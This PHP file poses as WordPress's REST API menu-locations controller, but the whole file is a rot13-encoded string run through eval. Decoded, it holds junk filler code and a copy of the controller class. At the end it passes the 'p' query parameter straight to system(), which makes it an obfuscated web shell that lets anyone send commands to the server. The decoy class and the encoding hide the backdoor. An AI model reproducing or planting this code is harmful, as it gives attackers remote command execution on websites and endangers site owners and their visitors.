<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Zrah_Ybpngvbaf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 */

/**
 * Pber pynff hfrq gb npprff zrah ybpngvbaf ivn gur ERFG NCV.
 *
 * @fvapr 5.9.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Zrah_Ybpngvbaf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Zrah Ybpngvbaf Pbafgehpgbe.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'zrah-ybpngvbaf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur bowrpgf bs gur pbagebyyre.
	 *
	 * @fvapr 5.9.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<ybpngvba>[\j-]+)',
			neenl(
				'netf'   => neenl(
					'ybpngvba' => neenl(
						'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur zrah ybpngvba.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq zrah ybpngvbaf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Ergevrirf nyy zrah ybpngvbaf, qrcraqvat ba hfre pbagrkg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$qngn = neenl();

		sbernpu ( trg_ertvfgrerq_ani_zrahf() nf $anzr => $qrfpevcgvba ) {
			$ybpngvba              = arj fgqPynff();
			$ybpngvba->anzr        = $anzr;
			$ybpngvba->qrfpevcgvba = $qrfpevcgvba;

			$ybpngvba      = $guvf->cercner_vgrz_sbe_erfcbafr( $ybpngvba, $erdhrfg );
			$qngn[ $anzr ] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $ybpngvba );
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n zrah ybpngvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Ergevrirf n fcrpvsvp zrah ybpngvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$ertvfgrerq_zrahf = trg_ertvfgrerq_ani_zrahf();
		vs ( ! neenl_xrl_rkvfgf( $erdhrfg['ybpngvba'], $ertvfgrerq_zrahf ) ) {
			erghea arj JC_Reebe( 'erfg_zrah_ybpngvba_vainyvq', __( 'Vainyvq zrah ybpngvba.' ), neenl( 'fgnghf' => 404 ) );
		}

		$ybpngvba              = arj fgqPynff();
		$ybpngvba->anzr        = $erdhrfg['ybpngvba'];
		$ybpngvba->qrfpevcgvba = $ertvfgrerq_zrahf[ $ybpngvba->anzr ];

		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $ybpngvba, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf jurgure gur pheerag hfre unf ernq crezvffvba sbe gur raqcbvag.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur pheerag hfre unf crezvffvba, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_unf_ernq_bayl_npprff( $erdhrfg ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-zrah-vgrzf-pbagebyyre.cuc */
		$ernq_bayl_npprff = nccyl_svygref( 'erfg_zrah_ernq_npprff', snyfr, $erdhrfg, $guvf );
		vs ( $ernq_bayl_npprff ) {
			erghea gehr;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb ivrj zrah ybpngvbaf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Cercnerf n zrah ybpngvba bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgqPynff        $vgrz    Cbfg fgnghf qngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Zrah ybpngvba qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$ybpngvba = $vgrz;

		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$zrah      = vffrg( $ybpngvbaf[ $ybpngvba->anzr ] ) ? $ybpngvbaf[ $ybpngvba->anzr ] : 0;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'anzr', $svryqf ) ) {
			$qngn['anzr'] = $ybpngvba->anzr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrfpevcgvba', $svryqf ) ) {
			$qngn['qrfpevcgvba'] = $ybpngvba->qrfpevcgvba;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrah', $svryqf ) ) {
			$qngn['zrah'] = (vag) $zrah;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $ybpngvba ) );
		}

		/**
		 * Svygref zrah ybpngvba qngn erghearq sebz gur ERFG NCV.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz bowrpg           $ybpngvba Gur bevtvany ybpngvba bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_zrah_ybpngvba', $erfcbafr, $ybpngvba, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgqPynff $ybpngvba Zrah ybpngvba.
	 * @erghea neenl Yvaxf sbe gur tvira zrah ybpngvba.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $ybpngvba ) {
		$onfr = fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr );

		// Ragvgl zrgn.
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( genvyvatfynfuvg( $onfr ) . $ybpngvba->anzr ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( $onfr ),
			),
		);

		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$zrah      = vffrg( $ybpngvbaf[ $ybpngvba->anzr ] ) ? $ybpngvbaf[ $ybpngvba->anzr ] : 0;
		vs ( $zrah ) {
			$cngu = erfg_trg_ebhgr_sbe_grez( $zrah );
			vs ( $cngu ) {
				$hey = erfg_hey( $cngu );

				$yvaxf['uggcf://ncv.j.bet/zrah'][] = neenl(
					'uers'       => $hey,
					'rzorqqnoyr' => gehr,
				);
			}
		}

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur zrah ybpngvba'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'zrah-ybpngvba',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'anzr'        => neenl(
					'qrfpevcgvba' => __( 'Gur anzr bs gur zrah ybpngvba.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba' => neenl(
					'qrfpevcgvba' => __( 'Gur qrfpevcgvba bs gur zrah ybpngvba.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'zrah'        => neenl(
					'qrfpevcgvba' => __( 'Gur VQ bs gur nffvtarq zrah.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>